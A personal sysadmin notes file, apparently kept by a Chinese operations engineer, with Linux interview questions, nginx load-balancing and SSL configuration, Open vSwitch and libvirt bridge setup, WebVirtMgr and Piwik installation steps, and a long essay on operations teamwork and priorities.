   10. 在虚拟机里添加一块1G的硬盘，请使用fdisk进行分区，分成2P+E的方式，
       P1大小为200M，P2大小为200M，E大小为600M，对应E分区，再分两个逻
       辑分区，分别为300M。
   11. 配置NFS服务后，不重新启动服务，如何使得配置生效？
	   #+BEGIN_SRC sh
exportfs -rv
/etc/init.d/nfs reload
	   #+END_SRC
** 题目018 - route命令
   #+BEGIN_EXAMPLE
   http://oldboy.51cto.com/2561410/1119453
   http://oldboy.51cto.com/2561410/974194
   #+END_EXAMPLE
** 题目019 - 定时任务
   在6月25日当天晚上23:59分给女友发一封邮件，祝福内容为：“happy
   birthday to you，my dear”，请写出命令
** 题目020 - 开机自启动问题
   把/data1/lavenliu.sh配置成开机自启动的服务
   #+BEGIN_SRC sh
   1. 放到/etc/rc.local
   2. 放到/etc/init.d/目录下
   #+END_SRC
** 题目021 - Linux或Windows下如何检查到baidu.com经过多少级路由
   #+BEGIN_SRC sh
   traceroute baidu.com 
   tracert -d www.taobao.com
   #+END_SRC
** 题目022 - 查看Apache进程命令
   #+BEGIN_SRC sh
   ps -ef |grep httpd
   #+END_SRC
** 题目023 - 568B网线的制作顺序
   #+BEGIN_EXAMPLE
   橙白 橙 绿白 蓝 蓝白 绿 棕白 棕
   #+END_EXAMPLE
** 题目024 - 定时任务相关
   每月4号及周一到周三每天上午11点执行/lavenliu.sh脚本
   #+BEGIN_SRC sh
   
   #+END_SRC
** 题目025 - route相关
   192.168.0.0/24网段通过192.168.0.1网关连入172.16.1.0/24 IP段，如何添
   加路由。
   #+BEGIN_SRC sh
   route add -net 172.16.1.0 network 255.255.255.0 gw 192.168.0.1
   #+END_SRC

#+BEGIN_EXAMPLE
<Context path="" docBase="/var/www/laven.com" debug="0" reloadable="false" crossContext="false">
</Context>
#+END_EXAMPLE
* nginx conf
  #+BEGIN_SRC sh
cat /usr/local/nginx/conf/nginx.conf
user  nginx;
worker_processes  2;

#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;

#pid        logs/nginx.pid;


events {
    worker_connections  10240;
	use epoll;
}


http {
    include       mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  logs/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    gzip  on;
	gzip_http_version 1.1;
	gzip_min_length 1k;
	gzip_disable "MSIE [1-6]\.";
	gzip_comp_level 2;
	gzip_proxied any;
	gzip_vary on;
	gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript;

	upstream web_pool {
        ip_hash;
		server 192.168.20.111:80 weight=5;
		server 192.168.20.112:80 weight=5;
	}

	upstream tomcat_pool {
        ip_hash; 
		server 192.168.20.113:8080 weight=5;
		server 192.168.20.114:8080 weight=5;
	}

    server {
		listen              80;
        listen              443 default ssl;
        server_name         www.zb.com;
		ssl_certificate     ssl/zb.com.crt;
		ssl_certificate_key ssl/zb.com_nopass.key;
		ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
		ssl_ciphers         HIGH:!aNULL:!MD5;
		ssl_prefer_server_ciphers  on;

        #charset koi8-r;

        #access_log  logs/host.access.log  main;

#		location ~ ^/api {
#			    rewrite /api/(.*)$ /$1 break;
#				proxy_pass http://web_pool;
#		}


        location / {
			root   html;
            index  index.jsp index.html index.htm;
			proxy_pass http://web_pool;
        }


        location /fund-trade-web/ {
#           	root   fund-trade-web;
            index  index.jsp index.html index.htm;


			proxy_redirect off;
            proxy_set_header Host $host; # 在header中设置主机名信息，让不同的域名可以转发至后端不同的RS的虚拟主机
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto https;
			proxy_set_header SSL_PROTOCOL $ssl_protocol;
			proxy_set_header X-Forwarded-Ssl on;
			proxy_connect_timeout 90;
			proxy_send_timeout 90;
			proxy_read_timeout 90;
			proxy_buffer_size 4k;
			proxy_buffers 4 32k;
			proxy_busy_buffers_size 64k;
			proxy_temp_file_write_size 64k;
			proxy_pass http://tomcat_pool;
        }


        location /fund-trade-admin/ {
#           	root   fund-trade-admin;
#            index  index.jsp index.html index.htm;

			proxy_redirect off;
			proxy_set_header Host $host; # 在header中设置主机名信息，让不同的域名可以转发至后端不同的RS的虚拟主机
			proxy_set_header X-Forwarded-For $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto https;
			proxy_set_header SSL_PROTOCOL $ssl_protocol;
			proxy_set_header X-Forwarded-Ssl on;
			proxy_connect_timeout 90;
			proxy_send_timeout 90;
			proxy_read_timeout 90;
			proxy_buffer_size 4k;
			proxy_buffers 4 32k;
			proxy_busy_buffers_size 64k;
			proxy_temp_file_write_size 64k;
			proxy_pass http://tomcat_pool;
        }

		location ~ .*\.(gif|jpg|png|bmp|jpeg|swf)$ {
		    expires 30d;
		}

		location ~ .*\.(js|css)?$ {
		    expires 1d;
		}


        #error_page  404              /404.html;

        # redirect server error pages to the static page /50x.html
        #
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
}
  #+END_SRC
* OVS
  Configuring Open vSwitch(OVS), Linux bridge, Libvirt
====================================================

Install
-------

Install the Open vSwitch package, this is on Fedora 19:

    $ yum install openvswitch -y


Enable the openvswitch systemd unit file, and start the daemon:

    $ systemctl enable openvswitch.service
    $ systemctl start openvswitch.service


Check the status, to ensure the openvswithc service is 'Active':

    $ systemctl status openvswitch.service
  

Configure a Linux bridge
------------------------

Disable NetworkManger service:

    $ systemctl disable NetworkManager.service 


Enable classic networking:

    $ systemctl enable network.service 


Create a file '/etc/sysconfig/network-scripts/ifcfg-br0' reflecting the
below contents:

    $ cat ifcfg-br0 
    DEVICE=br0
    ONBOOT=yes
    TYPE=Bridge
    BOOTPROTO=dhcp
    DELAY=0


Append the line

    BRIDGE=br0

to '/etc/sysconfig/network-scripts/ifcfg-em1' (or 'ifcfg-eth0'), save it:

An example:

    $ cat ifcfg-eth0 
    DEVICE=eth0
    ONBOOT=yes
    NETBOOT=yes
    UUID=3eee8eaf-6e5f-40ae-bdd5-3f0ecab84e94
    BOOTPROTO=dhcp
    HWADDR="e4:1f:13:41:03:e4"
    TYPE=Ethernet
    BRIDGE=br0


Stop NetworkManager service:

    $ systemctl stop NetworkManager.service 


Restart classic network service:

    $ systemctl restart network.service


Check the unit-file status of network & NetworkManger service:

    $ systemctl is-enabled network.service
    $ systemctl is-enabled NetworkManager.service


Your bridge(br0) will have the IP address , (and your em1 or eth0
interface will lose the IP address - which is expected).

    $ ifconfig br0 


Configure Open vSwitch
----------------------

Now that a regular Linux bridge is configured, let's try to configure an
OVS brdige and get IP addresses from that space:

Create an Open vSwitch bridge device called 'ovsbr', and display the
current state of OpenvSwitch database contents:

    $ ovs-vsctl add-br ovsbr
    $ ovs-vsctl show


Add a pair of virtual ethernet interfaces 'veth0' and 'veth1':

    $ ip link add name veth0 \
      type veth peer name veth1


Add 'veth0' ethernet device to the Linux bridge 'br0', and enumerate all
bridge devices:

    $ brctl addif br0 veth0
    $ brctl show


Now, associate virtual ethernet device 'veth1' to the OVS bridge,
and display the current state of OpenvSwitch database contents

    $ ovs-vsctl add-port ovsbr veth1
    $ ovs-vsctl show


Bring up both the virtual ethernet interfaces 'veth0' and 'veth1'

    $ ip link set veth0 up && \
      ip link set veth1 up


Update libvirt guest's bridge source to OVS
-------------------------------------------

Install a minimal Fedora guest with Oz (or any other mechanism):

    $ wget \
    https://github.com/kashyapc/virt-scripts/blob/master/oz/oz-jeos.bash
    $ ./oz-jeos f19-min f19

Once install is finished, define the guest XML from the current dir:

   $ virsh define f19-minJul_12_2013-12
    

Now let's edit libvirt's guest XML file to reflect its bridge source is
OVS bridge:

    $ virsh edit f19-min


The contents of the guest XML should reflect something along the below
lines:

    $ virsh dumpxml f19-min | grep bridge -A8
    <interface type='bridge'>
      <mac address='52:54:00:a6:08:70'/>
      <source bridge='ovsbr'/>
      <virtualport type='openvswitch'>
        <parameters interfaceid='ecdff22d-ce80-4ae7-a008-42994415084e'/>
      </virtualport>
      <target dev='vnet2'/>
      <model type='virtio'/>
      <alias name='net0'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
    </interface>


Start the guest, and the IP should be from the same subnet as the host:

    $ virsh start f19-jeos --console
    $ ifconfig eth0
* WebVirtMgr
  #+BEGIN_SRC sh
yum -y install git python-pip libvirt-python libxml2-python python-websockify supervisor nginx
  #+END_SRC

  #+BEGIN_SRC sh
git clone git://github.com/retspen/webvirtmgr.git
cd webvirtmgr
pip install -r requirements.txt
./manage.py syncdb
./manage.py collectstatic
./manage.py createsuperuser
  #+END_SRC

  #+BEGIN_SRC sh
cd ..
mv webvirtmgr /var/www/
vi /etc/nginx/conf.d/webvirtmgr.conf
server {
    listen 80 default_server;

    server_name $hostname;
    #access_log /var/log/nginx/webvirtmgr_access_log; 

    location /static/ {
        root /var/www/webvirtmgr/webvirtmgr; # or /srv instead of /var
        expires max;
    }

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for;
        proxy_set_header Host $host:$server_port;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 600;
        proxy_read_timeout 600;
        proxy_send_timeout 600;
        client_max_body_size 1024M; # Set higher depending on your needs 
    }
}


  #+END_SRC

  #+BEGIN_SRC sh
chown -R nginx:nginx /var/www/webvirtmgr
vi /etc/supervisord.conf
[program:webvirtmgr]
command=/usr/bin/python /var/www/webvirtmgr/manage.py run_gunicorn -c /var/www/webvirtmgr/conf/gunicorn.conf.py
directory=/var/www/webvirtmgr
autostart=true
autorestart=true
logfile=/var/log/supervisor/webvirtmgr.log
log_stderr=true
user=nginx

[program:webvirtmgr-console]
command=/usr/bin/python /var/www/webvirtmgr/console/webvirtmgr-console
directory=/var/www/webvirtmgr
autostart=true
autorestart=true
stdout_logfile=/var/log/supervisor/webvirtmgr-console.log
redirect_stderr=true
user=nginx
  #+END_SRC

  #+BEGIN_SRC sh
service supervisord stop
service supervisord start
  #+END_SRC
* nova
[root@openstack01 ~]# nova list --all-tenants
+--------------------------------------+---------+--------+------------+-------------+-------------------------+
| ID                                   | Name    | Status | Task State | Power State | Networks                |
+--------------------------------------+---------+--------+------------+-------------+-------------------------+
| 0fc5b033-a83d-470e-be9c-15f17ff5c495 | taoqi03 | ACTIVE | -          | Paused      | flat_net=192.168.20.193 |
+--------------------------------------+---------+--------+------------+-------------+-------------------------+

[root@openstack01 ~]# nova quota-defaults
+-----------------------------+-------+
| Quota                       | Limit |
+-----------------------------+-------+
| instances                   | 10    |
| cores                       | 20    |
| ram                         | 51200 |
| floating_ips                | 10    |
| fixed_ips                   | -1    |
| metadata_items              | 128   |
| injected_files              | 5     |
| injected_file_content_bytes | 10240 |
| injected_file_path_bytes    | 255   |
| key_pairs                   | 100   |
| security_groups             | 10    |
| security_group_rules        | 20    |
+-----------------------------+-------+
* Piwik
  #+BEGIN_SRC sh
wget http://builds.piwik.org/piwik.zip && unzip piwik.zip
  #+END_SRC
** Piwik Requirements
*** Required Configuration to Run Piwik
	To run Piwik your host needs a couple of things:
	1. Webserver such as Apache, Nginx, IIS, etc.
	2. PHP version 5.3.3 or greater
	3. MySQL version 4.1 or greater, or MariaDB.
	4. (enabled by default) PHP extension pdo and pdo_mysql, or the mysqli extension.

    Note that in 2016 we will drop support for PHP 5.3 in Piwik
    3.0.0. Piwik will then require PHP 5.5. Until then Piwik works
    well with any PHP >= 5.3.3.
*** Recommended Configuration
	We recommend using at least PHP 5.5 as it is much more memory
	efficient than previous PHP versions.

	To make the most of Piwik, you also need a few extra PHP
	extensions such as the PHP GD extesion that is used to generate
	teh sparklines (small graphs), graphs in statistics Email reports,
	as well as graphs in the Piwik Mobile App. The list of PHP
	extensions you are recommended install are: *php5-curl php5-gd php5-cli php5-geoip*
*** MySQL User requirements
	When installing Piwik, you will need to specify a MySQL username
	and password. The MySQL user must have permission to create and
	alter tables in the database. You can create a new database and
	MySQL user with the command:
	#+BEGIN_SRC sql
mysql> create database piwik;
mysql> create user 'piwik'@'localhost' identified by 'piwik123456';
mysql> grant select, insert, update, delete, create, drop, alter, create temporary tables, lock tables on piwik.* to 'piwik'@'localhost';
	#+END_SRC
	The MySQL USER should have the permission to SELECT, INSERT,
	UPDATE, DELETE, CREATE, DROP, ALTER, CREATE TEMPORARY TABLES, LOCK
	TABLES.
** Getting Started
   在我们开始之前，确保准备如下环境：
   1. 要有一个WEB服务器
   2. 可以访问到WEB服务器（通过shell或FTP）
   3. 一个FTP客户端

   跟安装wordpress差不多。然后把Piwik生成的JS代码放到网站的每个页面中。
   放到的位置为</body>标签的前面。
* Open vSwitch
* 学习资源列表
** RedHat
   https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/index.html
** InfoQ
   http://www.infoq.com/cn
** 高效运维七字诀
   专业、热情、方便、快

   我们用一个简单的公式来表示高效和专业的关系。专业是高效的基石，否则
   无从谈起高效与否，而技术是专业的基石。但这恰恰也是运维技术人员的误区所在，误以为，技术比较强，就足够了，并因此而
   忽视其他重要方面。

   实际上，对外部门而言，运维是个黑盒子，是一个输入输出的关系：外部门
   提出需求，运维给出结果：完成、或未完成。本质上而言，外部门不关心
   （也无法关心）我们采用什么技术来实现的，只关心是否如期完成。

   合理的流程规范，就像血液，能让部门稳定而高效的运转，大家都觉得开心，
   这也是专业与否的重要组成部分。但如果希望做到高效运维，良好的客户界
   面、合适的方法技巧，也非常有必要。这就像网站的UI，给人感觉舒服了，
   后面很多事情也能轻松愉快、顺理成章地进行。
*** 糟糕的分工及连环反应
	发生在中小公司的糟糕情况，往往从不明确的分工，开始悲剧之旅。有些游戏创业公司，刚开始时运维人员也就2、3个，
	基本每人都得会运维的各个工种，游戏运维、网站运维（Nginx/PHP等）、数据库运维（MySQL等）、系统运维（Linux/Windows等）、
	服务器上架、故障报修、甚至做网线。

	公司业务扩大很多后，如果运维组织结构不随之而变，分工不明确，就会发现大家都在疲于奔命，
	什么都会的结果就是什么都不精。在运维技术如此庞杂的今天，就是把人活活的架在火上烤。
	这样引发的是多米诺骨牌效应：分工不明确 —> 职责不清楚 —> 考核不量化—> 流程不合理—> 缺规范 、少文档。
*** 做vs说的困境
	一般运维技术人员都不善于沟通（至少表面上，虽然大家都普遍有火热的心，
	呵呵）。在微信、QQ大行其道的今天，这个问题变得更严重，而不是减轻。
	这也和工作性质有关，想想，一天到晚和服务器说话的时间，比和人说话时
	间都多。

	另外，从人脑结构来看，做和说两难全，也是合理的。控制计算、推理能力
	的是左脑，而表现力等由右脑控制。如果强行要求会做还会说，说不定会导
	致紊乱、崩溃甚至“脑裂”呢，呵呵（当然，这个问题也是有解决方法的）。
	
	更严重的是，很多同学没意识到自己的沟通表达是有问题的，说句话能把人
	呛死，也不知道如何有效表达。这样就谈不上热情了。
*** 资源错配
	管理者和员工都可能存在资源错配的问题。对管理者而言，包括人员错配和时间错配，员工主要是时间错配。

	管理者如果把错误的人安排在错误的岗位，那么注定是个错误。例如，某位同学喜欢钻研技术，不喜表达，非得让他作为和外部门的接口人，那自然费力不讨好，大家都不开心。

	管理者的时间错配包括三种情况。
**** 沉迷解决技术问题
	 这一般发生在刚从技术岗位提拔为管理者的时候，忘记自己是管理者了。
	 解决复杂技术问题，能带来愉悦感，否则就是挫折感。于是遇到技术问题
	 时，非得死磕到底，然后一周过去了，而部门其他同学却放羊一周。
**** 一心扑在管理上
	 这又是一个极端了，忘记自己的技术身份。把自己变成一个项目经理，整
	 天只关心时间节点，不关注技术人员的小情怀，不协助他们解决具体的技
	 术问题。
**** 沉迷单个业务模块
	 这是另一个特例。一般发生在内部提拔时。例如某位同学，之前是DBA组的
	 负责人，提拔为运维部经理后，还是习惯于抓其擅长的数据库工作，这也
	 是不应该的，否则就没必要提拔了嘛。
**** 总结
	 员工的资源错配主要体现在时间安排上。事情多了，分不清轻重缓急，没
	 有一个合理的排序原则、指导思想；混淆技术进步和工作要求（有时过分
	 追求技术进步），简单的问题复杂化，降低客户满意度。
*** 管理的专业化
	管理上的专业化运维，甚至包括调试通报和故障通报，都很有说法。系统运
	行一段时间后趋于稳定，调试/更新就变成了故障的主要来源之一，怎么让
	调试少出人为事故，顺利如期的完成？这是个技术活。
**** 运维345法则
	 故障通报是细究故障的不二法门，一次长时间的故障，往往有很多细节可
	 以推敲，我们总结出运维345法则。3是指故障时长被分成三部分，4是指对
	 应的四个故障时刻点，5是指在这个过程中我们可以做的五件事。这样，我
	 们就可以有的放矢地进行优化解决了。

	 运维345法则
*** 良好的客户界面
	伸手不打笑脸人。合适的言语表达，可以大事化小、小事化了，反之亦然。
	只是对做技术的运维同学而言，这是很不容易的事情，甚至有人宁愿多加班，
	也不去和人沟通。但，工作的要求有时往往需要善于表达，其实也可以换个
	角度想，把良好的沟通当做一门技术来攻克，如何？
**** 当面沟通
	 即时聊天工具如QQ、微信实际上是加剧了沟通成本。大家变得更加依赖与
	 此，本来当面沟通或电话沟通，几分钟就能说明白的事情，来来去去几十
	 分钟，更有甚者，还能吵起来，没法愉快的玩耍了。根据国外一项调查，
	 一次有效沟通中，词句内容仅占据一小部分。
**** 来的都是客
	 做运维的，应该放下身段，不一定非得低三下气地做事情，但至少意识得
	 到位。运维的沟通中，也适应心理学的投射原理：越是觉得别人盛气凌人、
	 服务不到位，其实自己也往往是这样的。

	 来的都是客。如果自己实在忙不开，响应慢。礼貌用语总是可以的嘛，不
	 好意思，对不起，抱歉，谢谢。
*** 做事原则、排序原则
**** 一次只做一件事
	 技术工作的特性，决定了得有整段时间（一般至少15~30分钟），才能沉下
	 心来、分析解决问题，才有效率。一般来说，一次只做一件事。
**** 故障是第一位的
	 故障是最重要紧急的，也应该优先处理。这个貌似很简单的事实，有时都
	 会被忽略。这发生在：

	 1. 该类故障，并未明确规定第一责任人，大家相互扯皮；
	 2. 故障第一责任人，沉浸在其他问题的解决中；
	 3. 故障第一责任人，心急火燎地在想办法，其他人主观感觉和自己没关系，
        没主动跟进、群策群力去反向推动和解决。

	 例如公司官网无法访问，这个情况可能是DNS有问题、Nginix挂掉了，PHP
	 出问题了，MySQL出故障了，网络堵塞了。各种情况都可能有，除非有智能
	 监控，故障自愈系统，或者责任人有丰富的处理经验，否则运维部门所有
	 工种，都应该主动去排查自己负责的部分是否有异常，并协助相关同学分
	 析解决。
**** 部门内部工作靠后
	 如果手头有多个重要紧急的业务需求，应及时向上级请示，将部门内部工
	 作排序靠后，先做部门外的业务需求。

	 部门内部工作，一般由运维负责人提出，如迁移Zabbix数据库、PHP性能调
	 优、新技术测试等。这类事情，实际上，交付日期是可协商的，往往并非
	 重要紧急。
	 
	 但也正因为是自己领导的需求，所以，往往被同学们分配更多的时间和更
	 高的优先级，以博得领导赞赏。毕竟，给外部门做得再多，考核自己的，
	 主要还是上级。
	 
	 这是潜意识指导下的、一种合乎理性的行为，我们不能简单的否定。所以，
	 这方面需要运维负责人的配合：需要主动、周期性的告知部门同学这个观
	 点，并且鼓励这种插队行为（当然，前提是和上级沟通了）。
**** 怎么更好低接单
	 为了更好地接单，窃以为关键点是，对自己狠一点：接到业务需求时，需
	 主动问询时间节点要求。从经验教训来看，事前商量好，总比事后被人催
	 要好（虽然会有些痛苦）。有些业务需求的回答往往是：越快越好（晕）。
	 这时就得帮助他们设定一个时间节点，而且得具体，不能模糊——如下周或
	 元旦后。一旦达成一致，就是一个契约。

	 如果完不成，请提前预警。客客气气地说几句好话、打个电话，真诚道歉
	 一把。最怕的情况是，设定的交付日期早过了，需求方来问进展，然后呆
	 萌呆萌地说：我忘了，还没开始做……
**** 勇于说不、合理拒绝
	 有办法礼貌地拒绝某些需求吗？还真有办法。拒绝别人得有理有据、不卑
	 不亢。例如，在工作量非常饱和的情况下，业务方（甚至自己领导）来加
	 塞，说又有一个非常重要、紧急的需求，需要立刻、马上开始，而且耗时
	 还较长。这时怎么办？

	 这时可以拿出自己的工时分配表来。就说，您看，这是我最近两周的工作
	 安排，都有这些事情，都是给这些部门做的。如果您的事情确实需要我来
	 完成，您可以和这些事情的需求方谈一谈，看是否能做个调配，或者我们
	 也可以一起去找我的上级，看是否能做个乾坤小挪移，等等。

	 另外，重要紧急往往是对别人而言，要关注那种每个需求都号称重要紧急、
	 恨不得就给他一个人服务的同学。所以，对需求方，我们也可以甄别下，
	 区别对待。
*** 爱抱怨及改进建议
	我们是公司的一份子，小公司问题很多，大公司更有各种通病。在一家公司
	呆个一年半载后，往往发现不如当初期望的那么美好，心情不畅，再加上还
	得面对生活的各种压力，难免各种坏情绪纷至沓来。

	其中，抱怨是我们最常见的情绪之一，甚至是一种背景式的存在。观察下我
	们脑海里不时冒出的自言自语，十有八九是抱怨。牢骚太多防断肠，抱怨可
	能会集结成怨恨、甚至怨气，严重损害自己身体。
**** 抱怨及其本质
	 抱怨隐含的意思是：我是对的，并将自己放在一个幻想中的道德优越感上。
	 抱怨是一种低调的攻击，常被用于自我保护，捍卫自我。抱怨的，都是过
	 去的事情，会白白的消耗自己的能量。（话语可能有些刺耳，请大家尽量
	 看完下面的文字。）

	 建议轻度抱怨，勿沉迷，别走心。如果把抱怨当做朋友间的一个话题，也
	 无伤大雅，当然，希望在这些时候，你知道自己是在抱怨（观察到抱怨的
	 过程，很有意义，但也很难，不信你试试）。
	 
	 事情不会因为我们抱怨，就变少。反而因我们抱怨，可能变得更加繁杂。

	 抱怨越多的人，往往是被抱怨越多的。其结果往往是，消极被动。所以好
	 消息是，积极主动，专治抱怨。
*** 积极主动的真正含义
	积极主动的含义：当我们的行为，将影响圈扩大，则被称为积极主动，否则就是消极被动。

	所谓影响圈，就是那些我们能掌控（直接控制）的事情；而只能间接控制、
	或无法掌控的事情，都属于关注圈。

	那么，我们能掌控的事情，都有哪些？思来想去，其实也就是自己的行为。
	如果我们管理着一个团队，可以指挥同学们做这个、做那个，这属于间接控
	制的事情。天气，则属于无法控制。

	我们往往将注意力放在关注圈，这是导致抱怨、并且被抱怨的重要原因。

	举个例子，业务推广因为网站不堪重负而失败，老板开骂。这时：
	#+BEGIN_EXAMPLE
	网站运营说，我早就告诉运维负责网站的哥们了，他就是不给我好好搞；

	网站运维说，我早就告诉系统组的同事了，他就是不及时给机器；

	系统运维说，我早就告诉采购部门了，他们一直没给我机器；
	
	采购部门说，我早就告诉供应商了，他们说缺1TB的硬盘，没法发货。
	#+END_EXAMPLE

	大家都对，但也都不对。例如，对网站运维而言，没法把控系统运维的服务
	器交付日期，但自己能做的事情，真的到此为止了么？这个情况，你是否及
	时向自己的上级和业务部门汇报？是否真的没办法，从自己负责的业务中，
	临时调拨下？

	对系统运维而言，是否真的不能从别的业务借用几台服务器先扛着？对采购
	部门而言，是否真的不能从服务器供应商借几台服务器先用着？
*** 通力合作
	如果出现重大故障，不要先假设自己负责的部分（如数据库）是没问题的，
	并带着主观倾向去分析问题，这样在言语表达上可能让人反感，而且也往往
	不正确。

	另外，也不要觉得自己负责的这部分没问题，于是对发生的重大故障，就再
	也不管不问、隔岸观火。应该主动和大家一起分析讨论，群策群力，解决问
	题。如果下次你负责的这部分出现了严重故障，其他人都漠然坐上观，你是
	否也会寒心？

	还是那句话，大家是一条线上的蚱蜢。重大故障出现了、长时间未解决，公
	司和外部门会说，你运维部不行、不专业。这时候，即使能独善其身，又有
	什么用？

	实在搞不懂轻重缓急，怎么办？这个好办，问上级呗，千万别自己憋着。领
	导是干什么的？不就是帮属下分忧解难的么，呵呵。甚至，偷偷地说，如果
	有个需求，实在完成不了了，也不要老是自己去和外部门解释，可以请领导
	出面。自己领导和需求方领导聊一聊，可能大事变小事哦。
* Perl
  #+BEGIN_SRC sh
perl -MCPAN -e 'install Net::SNMP'
  #+END_SRC
* 动手动手再动手-实践实践再实践
* 技术博客如何书写
  4W+1H

  1. 这个东西是什么
  2. 用在什么地方
  3. 什么时候用
  4. 为什么要这么做
  5. 怎么去用
* 学习新知识的思路
  没事就要整理自己的笔记，梳理笔记。进行合理的整理及删减。

  总分总的方式：
  1. 现有一个概貌的了解
  2. 有哪些子系统，都起什么作用
  3. 深入了解各个组件，各个击破
  4. 最后再次总结
* POST
  计算机系统启动：Power On and Self Testing（加电自检）

  计算机体系结构：
  + 运算器
  + 控制器
  + 存储器：内存。内存编址，平面编址，每一个存储单元在全局上有唯一的地址，使用数字的形式进行引用
  + 输入设备
  + 输出设备

  BIOS：Basic Input/Output System

  自举

  程序：指令+数据

* 架构设计
  层隔离

  实现每个服务之间的隔离

  环境标准化
  每个工程的目录、端口实现标准化、上线自动化、标准化

  可管理性
  权限的有效控制，防止权限过大

  服务端口使用
  0 不使用
  1-1023 系统保留，由root用户使用
  1024-4999 由客户端程序自由分配
  5000-65535 由服务器端程序自由分配

  堵住后门（运维人员与开发人员的操作），监控前门（外部的流量及攻击）。
** 五横三纵

